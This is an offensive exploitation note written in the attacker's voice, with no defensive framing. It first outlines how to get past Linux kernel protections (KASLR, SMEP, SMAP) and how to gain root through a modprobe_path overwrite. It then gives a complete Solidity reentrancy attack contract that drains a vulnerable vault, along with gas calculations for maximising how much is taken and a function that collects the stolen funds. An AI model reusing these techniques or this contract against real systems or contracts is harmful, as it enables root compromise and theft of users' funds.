**Bypassing SMEP/SMAP/KASLR:**
- KASLR: Leak kernel base via /proc/kallsyms (if readable), dmesg timestamps, or prefetch timing side-channel
- SMEP: Don't execute userspace code from kernel — use ROP within kernel text. Gadgets from vmlinux: `mov rdi, rax; call rcx` chains
- SMAP: userfaultfd trick works because copy_from_user temporarily disables SMAP via STAC instruction. Our attack operates within that window.

Alternative: Use modprobe_path overwrite — write path to our shell script into modprobe_path global, trigger unknown binary format, kernel executes our script as root.

**Reentrancy Exploit Against Vulnerable Vault:**

Vulnerable contract pattern:
```solidity
function withdraw(uint amount) external {
    require(balances[msg.sender] >= amount);
    (bool ok,) = msg.sender.call{value: amount}("");
    require(ok);
    balances[msg.sender] -= amount;  // BUG: state update AFTER external call
}
```

**Attacker contract:**
```solidity
contract ReentrancyAttack {
    VulnerableVault public vault;
    uint public constant DRAIN_AMOUNT = 1 ether;
    uint public count;
    uint public maxReentrancy;

    constructor(address _vault, uint _maxReentrancy) {
        vault = VulnerableVault(_vault);
        maxReentrancy = _maxReentrancy;
    }

    function attack() external payable {
        vault.deposit{value: DRAIN_AMOUNT}();
        vault.withdraw(DRAIN_AMOUNT);
    }

    receive() external payable {
        count++;
        if (count < maxReentrancy && address(vault).balance >= DRAIN_AMOUNT) {
            vault.withdraw(DRAIN_AMOUNT);
        }
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

**Gas calculation for recursion depth:**
Block gas limit: 30,000,000
Base transaction cost: ~21,000
First withdraw() call overhead: ~45,000 (SLOAD, comparison, CALL setup)
Each reentrant iteration: ~9,500 gas (CALL + SLOAD + comparison + stack ops)

Max iterations: (30,000,000 - 21,000 - 45,000) / 9,500 ≈ 3,151

If vault holds 100 ETH and we drain 1 ETH per iteration, we need 100 iterations — well within the gas limit. Set maxReentrancy = min(vault_balance / DRAIN_AMOUNT, 3000) with safety margin.

